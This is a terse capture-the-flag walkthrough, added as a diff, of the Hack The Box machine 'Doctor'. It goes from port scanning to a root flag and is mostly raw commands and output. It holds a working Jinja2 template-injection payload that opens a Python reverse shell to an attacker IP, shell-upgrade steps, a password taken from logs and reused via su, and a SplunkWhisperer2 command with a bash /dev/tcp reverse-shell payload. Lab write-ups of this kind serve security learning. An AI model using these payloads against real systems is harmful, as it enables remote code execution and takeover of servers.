@@ -1,0 +1,163 @@
+let's enumerate first:
+command: sudo rustscan -a 10.10.10.209
+result:
+Nmap scan report for doctors.htb (10.10.10.209)
+Host is up, received echo-reply ttl 63 (0.031s latency).
+Scanned at 2023-06-21 20:54:04 WIB for 0s
+
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack ttl 63
+80/tcp   open  http    syn-ack ttl 63
+8089/tcp open  unknown syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80,8089 10.10.10.209
+result:
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 594d4ec2d8cfda9da8c8d0fd99a84617 (RSA)
+|   256 7ff3dcfb2dafcbff9934ace0f8001e47 (ECDSA)
+|_  256 530e966b9ce9c1a170516c2dce7b43e8 (ED25519)
+80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
+| http-server-header: 
+|   Apache/2.4.41 (Ubuntu)
+|_  Werkzeug/1.0.1 Python/3.8.2
+| http-title: Doctor Secure Messaging - Login
+|_Requested resource was http://doctors.htb/login?next=%2F
+8089/tcp open  ssl/http Splunkd httpd
+| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
+| Not valid before: 2020-09-06T15:57:27
+|_Not valid after:  2023-09-06T15:57:27
+| http-robots.txt: 1 disallowed entry 
+|_/
+|_http-title: splunkd
+|_http-server-header: Splunkd
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 - 5.3 (90%), Crestron XPanel control system (90%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+access: http://10.10.10.209/
+response:
+HTTP/1.1 200 OK
+Date: Wed, 21 Jun 2023 13:57:01 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Last-Modified: Sat, 19 Sep 2020 16:59:55 GMT
+ETag: "4d88-5afad8bea6589-gzip"
+Accept-Ranges: bytes
+Vary: Accept-Encoding
+Content-Length: 19848
+Connection: close
+Content-Type: text/html
+
+take attention: 
+info@doctors.htb
+
+add this: 10.10.10.209 doctors.htb
+to /etc/hosts
+
+access: http://doctors.htb/login?next=%2F
+response:
+HTTP/1.1 200 OK
+Date: Wed, 21 Jun 2023 13:58:50 GMT
+Server: Werkzeug/1.0.1 Python/3.8.2
+Content-Type: text/html; charset=utf-8
+Vary: Cookie,Accept-Encoding
+Set-Cookie: session=eyJfZnJlc2giOmZhbHNlfQ.ZJMCGg.LB2fgiNtavew534Lzabk_0uWcIg; HttpOnly; Path=/
+Connection: close
+Content-Length: 4204
+
+let's register or signup
+register to this: http://doctors.htb/home?page=1
+acccess: view-source:http://doctors.htb/home?page=1
+take attention: 
+<!--archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>-->
+
+access: http://doctors.htb/post/new
+access: view-source:http://doctors.htb/archive
+    <?xml version="1.0" encoding="UTF-8" ?>
+	<rss version="2.0">
+	<channel>
+ 	<title>Archive</title>
+ 	<item><title>0xdf</title></item>
+
+			</channel>
+			
+SSTI attack
+test new message 
+title: ${7*7}
+content: ${5*5}
+access: view-source:http://doctors.htb/archive
+result:
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+<title>Archive</title>
+<item><title>0xdf</title></item>
+
+        </channel>
+        <item><title>${7*7}</title></item>
+
+        </channel>
+
+test new message 
+title: {{7*7}}
+content: {{5*5}}
+access: http://doctors.htb/archive
+result:
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0">
+<channel>
+<title>Archive</title>
+<item><title>0xdf</title></item>
+        </channel>
+        <item><title>${7*7}</title></item>
+        </channel>
+        <item><title>49</title></item>
+        </channel>
+
+paython rce payload:
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#exploit-the-ssti-by-calling-popen-without-guessing-the-offset
+
+code:
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.16.19\",7979)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+
+title: {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.16.19\",7979)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+content: 0xdf
+
+command: nc -lvnp 7979
+access: http://doctors.htb/archive
+
+command: id && whoami
+result: 
+uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
+web
+
+upgrade shell
+command: python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl + z
+command: stty raw -echo; fg
+> reset 
+> stty raw
+
+let's upload linpeas.sh to target machine.
+take attention:
+/var/log/apache2/backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] "POST /reset_password?email=Guitar123" 500 453 "http://doctor.htb/reset_password"
+/var/log/auth.log.1:Sep 22 13:01:23 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
+/var/log/auth.log.1:Sep 22 13:01:28 doctor sshd[1704]: Failed password for invalid user shaun from 10.10.14.2 port 40896 ssh2
+
+command: su - shaun
+password: Guitar123
+
+command: git clone https://github.com/cnotin/SplunkWhisperer2.git
+let's exploit splunkd
+
+command: nc -lvnp 4444
+command: python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.16.19 --username shaun --password Guitar123 --payload "bash -c 'bash -i >& /dev/tcp/10.10.16.19/4444 0>&1'"
+
+command: cat /root/root.txt
+5e8a6889973fd398f16b551ce64ff67f
+
+resource:
+https://0xdf.gitlab.io/2022/04/14/htb-jeeves.html
